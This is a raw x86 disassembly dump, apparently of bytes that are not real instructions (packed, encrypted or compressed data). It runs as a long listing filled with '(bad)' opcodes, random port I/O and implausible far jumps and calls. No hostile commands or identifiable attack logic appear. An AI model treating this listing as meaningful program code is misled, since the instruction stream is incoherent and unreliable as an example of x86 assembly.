  426355:	sbb    BYTE PTR [ebp+ecx*1-0x44],ch
  426359:	sub    DWORD PTR [edx],esi
  42635b:	cli    
  42635c:	iret   
  42635d:	jnp    0x426314
  42635f:	pop    ecx
  426360:	sbb    BYTE PTR [bx+si-0x2477],dh
  426365:	or     eax,0xe5034436
  42636a:	outs   dx,DWORD PTR ds:[esi]
  42636b:	outs   dx,BYTE PTR ds:[esi]
  42636c:	pusha  
  42636d:	jnp    0x42632c
  42636f:	xchg   esp,eax
  426370:	and    ebx,DWORD PTR [edx-0x44]
  426373:	scas   al,BYTE PTR es:[edi]
  426374:	sbb    al,0x40
  426376:	in     al,dx
  426377:	pop    ebx
  426378:	ins    BYTE PTR es:[edi],dx
  426379:	dec    esp
  42637a:	push   cs
  42637b:	push   es
  42637c:	test   al,0xc5
  42637e:	imul   edi,DWORD PTR [ecx-0x38],0xa590df5f
  426385:	adc    al,0x3b
  426387:	je     0x4263d4
  426389:	jns    0x4263cf
  42638b:	cmp    BYTE PTR [ebx],ch
  42638d:	adc    BYTE PTR [ebx+ebp*2-0x2cb13364],bl
  426394:	jbe    0x426316
  426396:	sbb    al,0x3b
  426398:	out    0x2a,eax
  42639a:	out    dx,eax
  42639b:	mov    dl,dh
  42639d:	aas    
  42639e:	inc    esi
  42639f:	mov    esp,0xbdb36e18
  4263a4:	mov    cs,WORD PTR [edx-0x1e]
  4263a7:	dec    esi
  4263a8:	dec    esi
  4263a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263aa:	push   ebp
  4263ab:	or     ecx,DWORD PTR [ebx+0x202b03a4]
  4263b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263b2:	inc    DWORD PTR [ebx-0x4aff53e8]
  4263b8:	je     0x4263eb
  4263ba:	jge    0x42638d
  4263bc:	xchg   BYTE PTR [ebp+0x3f],dh
  4263bf:	call   0xa216a46d
  4263c4:	jmp    0x16f05a51
  4263c9:	imul   esi,ecx,0x8c693087
  4263cf:	mov    esp,0x18adeffa
  4263d4:	(bad)  
  4263d6:	adc    al,0x58
  4263d8:	cmp    BYTE PTR ds:0xe567fb3f,dl
  4263de:	retf   0x544f
  4263e1:	xchg   edx,eax
  4263e2:	push   0x15
  4263e4:	cmp    eax,0xb9a16b52
  4263e9:	leave  
  4263ea:	xchg   ecx,eax
  4263eb:	ins    BYTE PTR es:[edi],dx
  4263ec:	pop    esi
  4263ed:	cmp    cl,0x8b
  4263f0:	call   0x3325:0x222a9512
  4263f7:	push   0x11
  4263f9:	(bad)  
  4263fa:	xor    eax,0xbbcd1561
  4263ff:	les    edx,FWORD PTR [ebx-0x2afc9b37]
  426405:	fcomp  DWORD PTR [edi-0x412701e8]
  42640b:	fdivr  QWORD PTR [edi+0x66]
  42640e:	in     eax,dx
  42640f:	or     BYTE PTR [esi-0x270c27df],ch
  426415:	and    esi,DWORD PTR [esi]
  426417:	(bad)  
  426419:	sbb    esp,DWORD PTR ds:0xee36fbfe
  42641f:	inc    eax
  426420:	adc    al,0xd5
  426422:	and    edi,eax
  426424:	cli    
  426425:	adc    eax,0x4da0919f
  42642a:	cld    
  42642b:	dec    edx
  42642c:	lahf   
  42642d:	mov    ebx,0x5a5ab230
  426432:	dec    edi
  426433:	mov    al,0xd3
  426435:	inc    ecx
  426436:	adc    DWORD PTR [ecx-0x14],ebp
  426439:	mov    esi,0x2b99ff9c
  42643e:	sub    ah,al
  426440:	cmp    eax,0xe553aec3
  426445:	es iret 
  426447:	xchg   esp,eax
  426448:	fidiv  DWORD PTR [ebx+0x5b]
  42644b:	and    al,0xf9
  42644d:	adc    al,0xac
  42644f:	jb     0x42647d
  426451:	pop    edx
  426452:	jne    0x42645c
  426454:	and    al,0x64
  426456:	mov    esi,0x8e556dc4
  42645b:	std    
  42645c:	adc    bl,cl
  42645e:	add    al,0x97
  426460:	mov    dl,0x8f
  426462:	jnp    0x4264bd
  426464:	mov    cs,WORD PTR [ecx]
  426466:	xor    eax,0xe04bc69e
  42646b:	pop    es
  42646c:	xchg   edi,eax
  42646d:	jmp    0x65db1b54
  426472:	adc    dl,ch
  426474:	mov    ebx,0xf77397ce
  426479:	cwde   
  42647a:	adc    al,0x38
  42647c:	add    DWORD PTR ds:0x4ab83433,eax
  426482:	or     al,0xce
  426484:	xchg   edi,eax
  426485:	jge    0x4264c4
  426487:	(bad)  
  426488:	sub    DWORD PTR [ecx],esi
  42648a:	and    BYTE PTR [esi+0x3],0xbc
  42648e:	jg     0x4264bd
  426490:	(bad)  
  426491:	outs   dx,DWORD PTR ds:[esi]
  426492:	shr    DWORD PTR [ebp+0x25cd8df6],0xc3
  426499:	mov    WORD PTR [ecx+0x5],?
  42649c:	inc    edi
  42649d:	aas    
  42649e:	mov    eax,ds:0xe7cf7788
  4264a3:	cli    
  4264a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264a5:	jb     0x4264b4
  4264a7:	(bad)  
  4264a8:	jae    0x426518
  4264aa:	lock pop edx
  4264ac:	jmp    0xbcae1ba5
  4264b1:	mov    esi,0xd401073b
  4264b6:	out    dx,al
  4264b7:	or     eax,DWORD PTR [esi]
  4264b9:	jbe    0x426520
  4264bb:	dec    eax
  4264bc:	xchg   edi,eax
  4264bd:	sbb    BYTE PTR ds:[edx+0x30198c07],0x4c
  4264c5:	test   al,0xbc
  4264c7:	stos   BYTE PTR es:[edi],al
  4264c8:	lds    ebx,FWORD PTR [ebx+0x79]
  4264cb:	push   cs
  4264cc:	shl    eax,cl
  4264ce:	fld    DWORD PTR [eax]
  4264d0:	pop    ds
  4264d1:	gs popa 
  4264d3:	daa    
  4264d4:	xor    eax,0xb3ace4a4
  4264d9:	push   ss
  4264da:	mov    dh,0x24
  4264dc:	sbb    edx,DWORD PTR [ecx+0x3c10f9]
	...
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	jno    0x42654a
  4264f8:	test   BYTE PTR fs:[esi],bh
  4264fb:	repnz add DWORD PTR [eax],eax
  4264fe:	jg     0x426506
  426500:	add    BYTE PTR [eax],al
  426502:	and    dl,BYTE PTR [ecx-0x75]
  426505:	int    0x20
  426507:	jns    0x4264e9
  426509:	stc    
  42650a:	adc    eax,0x9f7e5f0d
  42650f:	pop    ebp
  426510:	add    DWORD PTR [ebp-0x3c12270d],0xffffffe1
  426517:	push   edx
  426518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426519:	aas    
  42651a:	mov    bp,0xfe0
  42651e:	clc    
  42651f:	jae    0x4264fd
  426521:	jle    0x426518
  426523:	xchg   ecx,eax
  426524:	add    dh,BYTE PTR fs:[ecx+ebx*4-0x7c]
  426529:	xor    esi,DWORD PTR [eax-0x24]
  42652c:	xchg   DWORD PTR [edx+edi*2+0x38],ecx
  426530:	cmp    eax,0x970026d2
  426535:	xor    al,BYTE PTR [ecx-0x4f]
  426538:	shr    DWORD PTR [ebx+0x44],cl
  42653b:	lea    ecx,[ebx-0x21]
  42653e:	call   0x75ef9e5a
  426543:	xchg   esi,eax
  426544:	add    BYTE PTR [esi],dl
  426546:	push   es
  426547:	mov    edi,0xaa520412
  42654c:	(bad)
  426551:	jg     0x426561
  426553:	xlat   BYTE PTR ds:[ebx]
  426554:	imul   ebp,DWORD PTR [ebx],0x17d9901c
  42655a:	or     BYTE PTR [ebx],ch
  42655c:	mov    al,0x3c
  42655e:	in     eax,dx
  42655f:	mov    eax,ds:0xf1373a27
  426564:	fstp   QWORD PTR [edx-0x4eea1b76]
  42656a:	fwait
  42656b:	push   ebx
  42656c:	and    eax,0xb95fb69b
  426571:	and    BYTE PTR [edx],dl
  426573:	test   eax,0x2622916f
  426578:	add    ah,bh
  42657a:	mov    esp,0xdc6a1e7b
  42657f:	mov    edx,DWORD PTR [eax]
  426581:	(bad)  
  426582:	sbb    edx,DWORD PTR [edx+0x39]
  426585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426586:	xchg   esi,eax
  426587:	(bad)  
  426588:	div    BYTE PTR [edx-0x18b2d209]
  42658e:	or     dl,BYTE PTR [ebx-0x77cebdd8]
  426594:	sbb    esp,edi
  426596:	mov    ah,0x27
  426598:	sbb    ch,dh
  42659a:	add    BYTE PTR [ebx],ah
  42659c:	and    DWORD PTR [ecx-0x59],esi
  42659f:	div    DWORD PTR [esi-0x386c1d9e]
  4265a5:	pop    esp
  4265a6:	inc    edi
  4265a7:	int    0x20
  4265a9:	shr    cl,cl
  4265ab:	sbb    bl,dl
  4265ad:	xchg   esp,edi
  4265af:	mov    eax,0xd58f4438
  4265b4:	popf   
  4265b5:	mov    edx,0xab0782b6
  4265ba:	sahf   
  4265bb:	add    al,al
  4265bd:	fild   DWORD PTR [ecx]
  4265bf:	arpl   WORD PTR [ecx-0x59],si
  4265c2:	fisub  DWORD PTR [ecx]
  4265c4:	dec    BYTE PTR [edx]
  4265c6:	mov    cl,0xa2
  4265c8:	or     cl,ah
  4265ca:	test   al,0xd7
  4265cc:	lahf   
  4265cd:	aad    0x7c
  4265cf:	retf   
  4265d0:	mov    ebp,0x3916fe52
  4265d5:	ins    DWORD PTR es:[edi],dx
  4265d6:	retf   
  4265d7:	cmovae esi,esp
  4265da:	mov    ecx,0x809cf062
  4265df:	out    dx,al
  4265e0:	je     0x426640
  4265e2:	lods   eax,DWORD PTR ds:[esi]
  4265e3:	jp     0x42663e
  4265e5:	sbb    ah,0x71
  4265e8:	or     al,0x30
  4265ea:	xchg   BYTE PTR [edi+0x7a],ah
  4265ed:	pause  
  4265ef:	scas   eax,DWORD PTR es:[edi]
  4265f0:	jmp    0x48bc73c
  4265f5:	ficom  WORD PTR [edi-0x66db301]
  4265fb:	inc    esi
  4265fc:	jmp    0xa623960
  426601:	and    esp,DWORD PTR ds:0x4ff77711
  426607:	int    0x75
  426609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42660a:	push   esi
  42660b:	retf   0x8fba
  42660e:	mov    al,0x69
  426610:	mov    eax,0xc571184d
  426615:	push   ecx
  426616:	into   
  426617:	rcr    ecx,cl
  426619:	xor    eax,0x98a8b835
  42661e:	adc    BYTE PTR [esi+0x26765a2],0x5f
  426625:	and    DWORD PTR [ebp+0x1c],esp
  426628:	and    BYTE PTR [esi-0x71],ch
  42662b:	sub    al,0x97
  42662d:	and    DWORD PTR [eax],ebp
  42662f:	cwde   
  426630:	mov    cl,0x5d
  426632:	pop    ebp
  426634:	in     al,dx
  426635:	ucomiss xmm2,DWORD PTR [ecx-0x86ede6c]
  42663c:	xor    eax,0x9618cd66
  426641:	pop    esi
  426642:	or     ch,BYTE PTR [esi]
  426644:	loope  0x4266ae
  426646:	lods   eax,DWORD PTR ds:[esi]
  426647:	cmc    
  426648:	mov    WORD PTR [ebx-0x8],cs
  42664b:	std    
  42664c:	cld    
  42664d:	xchg   ecx,eax
  42664e:	mov    DWORD PTR [edi+0x18],edi
  426651:	ins    BYTE PTR es:[edi],dx
  426652:	test   al,0x92
  426654:	dec    esp
  426655:	ret    0x9b41
  426658:	xchg   edx,eax
  426659:	jg     0x426678
  42665b:	xor    BYTE PTR [edx],ch
  42665d:	mov    ebx,0xa7cb4995
  426662:	dec    ecx
  426663:	mov    ds:0xd4aa3bf8,al
  426668:	xor    BYTE PTR [esi],bl
  42666a:	call   0xcdfeb1bc
  42666f:	adc    BYTE PTR [ebp+0x16cf81ad],al
  426675:	xor    esp,ebx
  426677:	dec    BYTE PTR [eax-0x25]
  42667a:	mov    dl,bh
  42667c:	das    
  42667d:	mov    ah,0x2c
  42667f:	sub    al,BYTE PTR [esp+esi*8-0x45]
  426683:	std    
  426684:	xlat   BYTE PTR ds:[ebx]
  426685:	or     eax,0xb149809f
  42668a:	jmp    0x507e23b
  42668f:	inc    edx
  426690:	fcmove st,st(1)
  426692:	clc    
  426693:	mov    bl,0xb7
  426695:	test   al,0x8c
  426697:	jge    0x4266e5
  426699:	fwait
  42669a:	adc    al,0xd1
  42669c:	mov    ds:0x9f62c56a,eax
  4266a1:	pop    ss
  4266a2:	xor    eax,0xbc11cd76
  4266a7:	rcl    BYTE PTR [ecx-0x1f],0x97
  4266ab:	xor    al,0x7e
  4266ad:	and    DWORD PTR [ebx+ecx*4-0x2663f352],eax
  4266b4:	push   ds
  4266b5:	push   edi
  4266b6:	inc    esp
  4266b7:	(bad)  
  4266b8:	sub    edi,DWORD PTR [edx]
  4266ba:	push   esi
  4266bb:	mov    eax,ss
  4266bd:	lods   eax,DWORD PTR ds:[esi]
  4266be:	leave  
  4266bf:	dec    edi
  4266c0:	out    dx,eax
  4266c1:	ror    DWORD PTR [edx],0x3e
  4266c4:	xor    BYTE PTR [edx-0x1b57b84b],cl
  4266ca:	xlat   BYTE PTR es:[ebx]
  4266cc:	retf   
  4266cd:	pop    ecx
  4266ce:	sub    eax,0xf3a490ee
  4266d3:	ins    BYTE PTR es:[edi],dx
  4266d4:	test   BYTE PTR ds:0xc55ed54,ch
  4266da:	ja     0x426692
  4266dc:	movups XMMWORD PTR [edi],xmm6
  4266df:	or     eax,0x2b46dc24
  4266e4:	into   
  4266e5:	mov    eax,ds:0x36f68cdf
  4266ea:	(bad)  
  4266ec:	pop    edi
  4266ed:	inc    cx
  4266ef:	aaa    
  4266f0:	and    eax,0xa378ccd9
  4266f5:	mov    edx,0x51a8003f
  4266fa:	inc    edi
  4266fb:	js     0x426682
  4266fd:	push   cs
  4266fe:	adc    dl,dl
  426700:	push   ss
  426701:	adc    al,0x39
  426703:	pop    ds
  426704:	cmp    BYTE PTR [edi+0x3fb48152],bl
  42670a:	scas   eax,DWORD PTR es:[edi]
  42670b:	mov    esi,0x3696f7ca
  426710:	mov    cl,BYTE PTR [eax+0x43]
  426713:	mov    ebp,0x6a6f3d63
  426718:	enter  0x39c8,0xaa
  42671c:	mov    edi,0xb1e2bede
  426721:	outs   dx,DWORD PTR ds:[esi]
  426722:	mov    edi,0x4db05c7f
  426727:	repz and DWORD PTR [edx+edx*1+0xe],esi
  42672c:	or     esp,0xde105f89
  426732:	xchg   esi,eax
  426733:	(bad)  
  426735:	fidivr DWORD PTR [ecx+0x44]
  426738:	ficomp DWORD PTR [ecx+0x7d127556]
  42673e:	stos   DWORD PTR es:[edi],eax
  42673f:	js     0x42678d
  426741:	adc    ebp,DWORD PTR [eax+esi*4+0x4b67c806]
  426748:	or     ebx,DWORD PTR [ebx+0x23942914]
  42674e:	push   ebx
  42674f:	leave  
  426750:	repz in al,dx
  426752:	or     ebx,edi
  426754:	sbb    bh,BYTE PTR [edx+0x2339470e]
  42675a:	rcl    DWORD PTR [edi],1
  42675c:	mov    ds,esi
  42675e:	push   ebp
  42675f:	inc    eax
  426760:	xchg   ebp,eax
  426761:	mov    eax,ds:0x36fc706
  426766:	imul   ebp,DWORD PTR [ebx],0xce385b12
  42676c:	data16 mov bh,0x68
  42676f:	in     eax,0xfb
  426771:	xor    al,0x72
  426773:	mov    ah,0xd8
  426775:	rcr    BYTE PTR [ebx-0x508ecf74],0x48
  42677c:	in     al,dx
  42677d:	(bad)  
  42677f:	jb     0x426726
  426781:	lds    edx,FWORD PTR [edx]
  426783:	lea    ebx,[ebx-0x59]
  426786:	jp     0x426733
  426788:	add    BYTE PTR [eax-0x62],0xf0
  42678c:	push   cs
  42678d:	jl     0x4267ed
  42678f:	lea    ebx,[ebp+0xa2e694f]
  426795:	les    esp,FWORD PTR [edi+0x70]
  426798:	sbb    eax,0xd4e7825a
  42679d:	add    eax,0xe2a88191
  4267a2:	or     al,BYTE PTR [edx]
  4267a4:	inc    ebp
  4267a5:	inc    BYTE PTR [esi+0x1b8aee2d]
  4267ab:	mov    ebx,0x16dc6923
  4267b0:	inc    ebx
  4267b1:	ja     0x42675a
  4267b3:	test   DWORD PTR [edi+ecx*1-0x2438df0f],eax
  4267ba:	ret    0xd884
  4267bd:	inc    esp
  4267be:	mov    ah,0x99
  4267c0:	jmp    0x70e81ce8
  4267c5:	int3   
  4267c6:	stc    
  4267c7:	mov    eax,ds:0xa1fe17f0
  4267cc:	(bad)  
  4267cd:	scas   eax,DWORD PTR es:[edi]
  4267ce:	push   cs
  4267cf:	(bad)  
  4267d0:	mov    edx,0xec790ad8
  4267d5:	test   BYTE PTR [eax],ch
  4267d7:	rcr    DWORD PTR [ebp+0x69],1
  4267da:	add    BYTE PTR [edx-0x6145ed20],bl
  4267e0:	fucom  st(6)
  4267e2:	mov    esi,DWORD PTR [edi+0x66]
  4267e5:	and    eax,0xa158dd2
  4267ea:	arpl   WORD PTR fs:[ecx],dx
  4267ed:	pop    ecx
  4267ee:	push   edi
  4267ef:	sub    DWORD PTR [esi],esp
  4267f1:	iret   
  4267f2:	daa    
  4267f3:	xor    BYTE PTR [edx+0x1f25b90a],dh
  4267f9:	(bad)  
  4267fa:	sbb    ecx,DWORD PTR [edx]
  4267fc:	pushf  
  4267fd:	or     dl,BYTE PTR [eax-0x791240a6]
  426803:	push   edx
  426804:	jbe    0x4267a7
  426806:	test   BYTE PTR [ecx+edx*2],ah
  426809:	cwde   
  42680a:	lock sub edx,eax
  42680d:	add    bh,BYTE PTR [eax-0x4ca13524]
  426813:	bnd ss je 0x4267fd
  426817:	fmul   st,st(1)
  426819:	stc    
  42681a:	or     eax,0x84d07382
  42681f:	shl    DWORD PTR [eax-0x7f38f0e8],0x52
  426826:	xchg   edx,eax
  426827:	leave  
  426828:	ret    
  426829:	fidivr WORD PTR [ebp+edi*2-0x2ba2b487]
  426830:	dec    eax
  426831:	jbe    0x4268ab
  426833:	cmp    al,0x8
  426835:	jmp    0x7c2bb7f3
  42683a:	or     BYTE PTR [ecx+0x37],0x16
  42683e:	add    BYTE PTR ds:0xd31ee19f,dh
  426844:	jecxz  0x4267c8
  426846:	xor    esp,DWORD PTR ds:0x12d10aea
  42684c:	cmp    DWORD PTR [ebx+0x639e04b1],esp
  426852:	jmp    0x9590:0x410efd5c
  426859:	lods   eax,DWORD PTR ds:[esi]
  42685a:	or     al,BYTE PTR [esi-0x6e1f92e7]
  426860:	sub    al,0x17
  426862:	mov    al,ds:0x5c96e698
  426867:	pop    ds
  426868:	push   ss
  426869:	adc    al,0x71
  42686b:	cs push ss
  42686d:	je     0x42685c
  42686f:	sub    bh,ch
  426871:	jnp    0x426877
  426873:	jmp    0x83c5:0xe232c5c3
  42687a:	xor    ah,BYTE PTR [edx-0x75]
  42687d:	pop    es
  42687e:	aad    0xc7
  426880:	hlt    
  426881:	and    DWORD PTR [ebx],0xffffff98
  426884:	repnz dec edi
  426886:	pop    esp
  426887:	jb     0x42680c
  426889:	push   esp
  42688a:	loopne 0x426849
  42688c:	xor    cl,BYTE PTR [ecx+edi*4+0x41]
  426890:	mov    eax,ds:0x19677f28
  426895:	or     BYTE PTR [esi-0x48],al
  426898:	cmp    eax,0x47e1ba2
  42689d:	mov    eax,ds:0x1d71928
  4268a2:	adc    ebp,ecx
  4268a4:	in     al,dx
  4268a5:	call   0x89bb:0x2c6fe2bc
  4268ac:	or     al,0x47
  4268ae:	jp     0x42690b
  4268b0:	sub    DWORD PTR [edx],ebx
  4268b2:	arpl   WORD PTR [edi-0x54],sp
  4268b5:	lea    edi,[eax-0x6]
  4268b8:	or     DWORD PTR [edx-0x7c],0xffffffaa
  4268bc:	in     al,dx
  4268bd:	and    eax,0xb10fab7c
  4268c2:	jmp    0x741:0x6f6ef7d0
  4268c9:	sbb    edi,DWORD PTR [ebx+edi*8+0x42]
  4268cd:	loopne 0x42688b
  4268cf:	cmc    
  4268d0:	shl    DWORD PTR [esi-0x6c420732],0xb
  4268d7:	mov    bl,0x19
  4268d9:	ret    
  4268da:	cld    
  4268db:	dec    eax
  4268dc:	cli    
  4268dd:	jnp    0x4268e7
  4268df:	push   edi
  4268e0:	(bad)  
  4268e1:	or     al,0x93
  4268e3:	adc    al,bh
  4268e5:	dec    ebx
  4268e6:	dec    ecx
  4268e7:	mov    edi,0x6d969666
  4268ec:	push   ds
  4268ed:	push   eax
  4268ee:	mov    ebx,esp
  4268f0:	xchg   esi,eax
  4268f1:	adc    ecx,DWORD PTR [ecx-0x3eb6575f]
  4268f7:	rol    BYTE PTR [esi],0x9b
  4268fa:	xor    al,0x42
  4268fc:	xchg   ebp,eax
  4268fd:	test   eax,0x6115b3c8
  426902:	push   ss
  426903:	xchg   DWORD PTR [ebp+0x22],ebx
  426906:	pop    ss
  426907:	dec    ebp
  426908:	jns    0x42693a
  42690a:	retf   
  42690b:	xchg   BYTE PTR [ecx+0x26c77e37],ah
  426911:	lds    edi,FWORD PTR [ebx]
  426913:	dec    edx
  426914:	ret    
  426915:	xchg   ch,cl
  426917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426918:	xchg   ebp,eax
  426919:	int    0x96
  42691b:	jle    0x426905
  42691d:	xor    DWORD PTR [ebx-0x4],ebx
  426920:	push   ss
  426921:	rcl    DWORD PTR [eax],0xc5
  426924:	inc    edi
  426925:	dec    ebp
  426926:	and    ebx,DWORD PTR [esi-0x6bbf8f5a]
  42692c:	adc    edi,DWORD PTR [edi]
  42692e:	nop    DWORD PTR [edx-0x34d86e79]
  426935:	mov    ecx,0x82fe2260
  42693a:	dec    edx
  42693b:	outs   dx,BYTE PTR ds:[esi]
  42693c:	xchg   esi,eax
  42693d:	mov    ch,ah
  42693f:	pop    es
  426940:	dec    BYTE PTR [ebx-0x70]
  426943:	or     DWORD PTR [eax-0x71],esi
  426946:	test   eax,0x53c0d53c
  42694b:	cvttps2pi mm7,xmm5
  42694e:	and    al,0x32
  426950:	(bad)  
  426951:	retf   
  426952:	repz test eax,0x35e813f
  426958:	retf   0xd3f9
  42695b:	xlat   BYTE PTR ds:[ebx]
  42695c:	fdiv   QWORD PTR [ebp+eiz*2+0x2488f053]
  426963:	adc    dl,dh
  426965:	push   edi
  426966:	les    edx,FWORD PTR [eax-0x49850513]
  42696c:	dec    ecx
  42696d:	fwait
  42696e:	mov    esi,0xaf1bda3f
  426973:	mov    DWORD PTR [esi+0x1530b6b4],ebx
  426979:	neg    DWORD PTR [esi+0x3286688f]
  42697f:	mov    esi,esi
  426981:	lods   al,BYTE PTR ds:[esi]
  426982:	sub    edi,DWORD PTR [ebx+0x79]
  426985:	push   edi
  426986:	cmp    BYTE PTR [ebp*2+0x2e3228e5],dl
  42698d:	push   0x27a86021
  426992:	jl     0x4269a4
  426994:	(bad)
  426997:	inc    edx
  426998:	ret    
  426999:	ficomp DWORD PTR [eax+0x54]
  42699c:	in     ax,0x14
  42699f:	imul   edx,DWORD PTR [edx+0x33fab10],0x305f0ccb
  4269a9:	xchg   DWORD PTR [esi+0x75],ebp
  4269ac:	idiv   BYTE PTR [edx+edi*2-0x248c3f1d]
  4269b3:	sbb    DWORD PTR [esi+edx*4],edx
  4269b6:	outs   dx,BYTE PTR ds:[esi]
  4269b7:	push   es
  4269b8:	add    ecx,edi
  4269ba:	inc    eax
  4269bb:	sbb    al,0xaa
  4269bd:	push   ecx
  4269be:	(bad)  
  4269bf:	call   0x2f34dd06
  4269c4:	jno    0x4269e7
  4269c6:	lods   al,BYTE PTR ds:[esi]
  4269c7:	aad    0xe3
  4269c9:	pusha  
  4269ca:	lods   al,BYTE PTR ds:[esi]
  4269cb:	cmc    
  4269cc:	call   0x332389c2
  4269d1:	cmp    al,0xb7
  4269d3:	inc    esi
  4269d4:	call   0xf736:0xf3c63548
  4269db:	lods   eax,DWORD PTR ds:[esi]
  4269dc:	repnz nop
  4269de:	push   eax
  4269df:	jl     0x426a31
  4269e1:	(bad)  
  4269e2:	adc    eax,0x26d3edc3
  4269e7:	sahf   
  4269e8:	xchg   esi,eax
  4269e9:	sti    
  4269ea:	sub    bp,ax
  4269ed:	adc    BYTE PTR [eax+0x53287c29],0x81
  4269f4:	sbb    eax,esi
  4269f6:	loop   0x426a58
  4269f8:	test   BYTE PTR [edi+0x11],bh
  4269fb:	add    eax,0xc22135e6
  426a00:	mov    edx,0x44e45dc8
  426a05:	repnz sbb eax,0x826d5331
  426a0b:	xor    eax,0x6e700d49
  426a10:	mov    edx,0x5e87b598
  426a15:	stc    
  426a16:	inc    ebp
  426a17:	adc    DWORD PTR [esi-0x6d],ebp
  426a1a:	into   
  426a1b:	ss dec edi
  426a1d:	add    al,0x10
  426a1f:	and    bl,cl
  426a21:	lock daa 
  426a23:	sti    
  426a24:	mov    eax,0x488730d4
  426a29:	mov    bh,0xce
  426a2b:	mov    bl,0x98
  426a2d:	dec    esp
  426a2e:	xor    cl,BYTE PTR [ebp-0x3b0802bb]
  426a34:	stos   BYTE PTR es:[edi],al
  426a35:	xor    bh,BYTE PTR [edi]
  426a37:	jmp    0x426a89
  426a39:	(bad)  
  426a3a:	loop   0x426a52
  426a3c:	icebp  
  426a3d:	mov    WORD PTR [ebx],ds
  426a3f:	test   BYTE PTR [edi+0x60],ah
  426a42:	retf   0xd5fd
  426a45:	fist   WORD PTR [ebx-0xc4dd2f0]
  426a4b:	(bad)  
  426a4c:	mov    edx,0xaa3f5bd8
  426a51:	push   ss
  426a52:	stos   BYTE PTR es:[edi],al
  426a53:	test   al,0x70
  426a55:	(bad)  
  426a56:	mov    dh,0x96
  426a58:	mov    bh,0x79
  426a5a:	jnp    0x4269e4
  426a5c:	in     al,0xec
  426a5e:	pushf  
  426a5f:	jns    0x426a29
  426a61:	inc    DWORD PTR [ebp+0x4fe1eb9c]
  426a67:	xlat   BYTE PTR ds:[ebx]
  426a68:	inc    ebx
  426a69:	inc    esi
  426a6a:	les    ebp,FWORD PTR [ecx+0x3e150483]
  426a70:	push   ecx
  426a71:	mov    ds:0xa3c40234,al
  426a76:	cmp    BYTE PTR [esi-0x6b],ch
  426a79:	and    dh,BYTE PTR [edi]
  426a7b:	mov    dh,0xc4
  426a7d:	std    
  426a7e:	(bad)  
  426a7f:	test   BYTE PTR [edx],0x99
  426a82:	sbb    DWORD PTR [ecx+0x4a934fdf],ebp
  426a88:	stos   BYTE PTR es:[edi],al
  426a89:	mov    gs,WORD PTR [ecx]
  426a8b:	(bad)
  426a8e:	(bad)  
  426a8f:	iret   
  426a90:	inc    eax
  426a91:	and    eax,0x710992e0
  426a96:	xor    bh,BYTE PTR ds:0x356d0473
  426a9c:	popa   
  426a9d:	ret    0xe8bc
  426aa0:	loop   0x426a7c
  426aa2:	dec    ebp
  426aa3:	mov    WORD PTR [ebx],ds
  426aa5:	inc    esi
  426aa6:	fbld   TBYTE PTR [ebx]
  426aa8:	inc    edi
  426aa9:	ins    BYTE PTR es:[edi],dx
  426aaa:	xor    ecx,ebx
  426aac:	jbe    0x426afe
  426aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aaf:	scas   eax,DWORD PTR es:[edi]
  426ab0:	inc    esp
  426ab1:	cmp    bl,BYTE PTR [ecx+0x21]
  426ab4:	loope  0x426a4d
  426ab6:	fidiv  WORD PTR [ebx+eax*8-0x218b04d6]
  426abd:	dec    edi
  426abe:	test   eax,0x73d2772c
  426ac4:	scas   eax,DWORD PTR es:[edi]
  426ac5:	adc    eax,0xa22707b1
  426aca:	adc    bl,dh
  426acc:	xor    eax,0x13853b64
  426ad1:	sub    eax,0x5a17ec8d
  426ad6:	fistp  WORD PTR [edi-0x2df03ba0]
  426adc:	enter  0x4acc,0x71
  426ae0:	cwde   
  426ae1:	mov    ds:0x1be20beb,al
  426ae6:	mov    edx,0xcd60c258
  426aeb:	and    ah,BYTE PTR [ecx]
  426aed:	fdivr  st(3),st
  426aef:	add    DWORD PTR [ebx-0x1b0f4529],esp
  426af5:	stos   DWORD PTR es:[edi],eax
  426af6:	ins    DWORD PTR es:[edi],dx
  426af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426af8:	sbb    ecx,DWORD PTR [ebp+ebx*1-0x1]
  426afc:	(bad)  
  426afd:	jle    0x426b59
  426aff:	cdq    
  426b00:	xchg   ecx,eax
  426b01:	pop    ds
  426b02:	sbb    eax,0x8c051ee2
  426b07:	iret   
  426b08:	xor    al,0x4
  426b0a:	push   ebx
  426b0b:	jg     0x426ac2
  426b0d:	cdq    
  426b0e:	sbb    eax,0xb46d233f
  426b13:	push   ebp
  426b14:	or     ebx,DWORD PTR [ecx+0x37]
  426b17:	add    cl,BYTE PTR [eax+0x1e]
  426b1a:	pop    es
  426b1b:	pop    edi
  426b1c:	dec    ecx
  426b1d:	or     ch,0x78
  426b20:	mov    esi,0x46a2dad1
  426b25:	std    
  426b26:	push   eax
  426b27:	push   esi
  426b28:	jno    0x426afd
  426b2a:	add    DWORD PTR [ebp-0x62],edi
  426b2d:	adc    BYTE PTR gs:[ebx-0x76eda8ca],cl
  426b34:	cmp    al,BYTE PTR [esi-0x60b3967d]
  426b3a:	push   0xffffff98
  426b3c:	repnz pusha 
  426b3e:	push   edx
  426b3f:	dec    esi
  426b40:	push   ebp
  426b41:	cmp    ch,cl
  426b43:	sub    BYTE PTR [ebx],0xff
  426b46:	lods   eax,DWORD PTR ds:[esi]
  426b47:	popa   
  426b48:	xchg   DWORD PTR [ebx-0x576b032f],eax
  426b4e:	ja     0x426bc6
  426b50:	sbb    BYTE PTR ds:0x78666374,0x2e
  426b57:	ds std 
  426b59:	data16 fwait
  426b5b:	sub    edx,DWORD PTR [esi+0x1c]
  426b5e:	retf   
  426b5f:	push   0x59649abd
  426b64:	sbb    ecx,ecx
  426b66:	sub    ecx,edx
  426b68:	mov    DWORD PTR [esp+0x4bc01856],ebp
  426b6f:	mov    ch,BYTE PTR ds:0x8cc6e97a
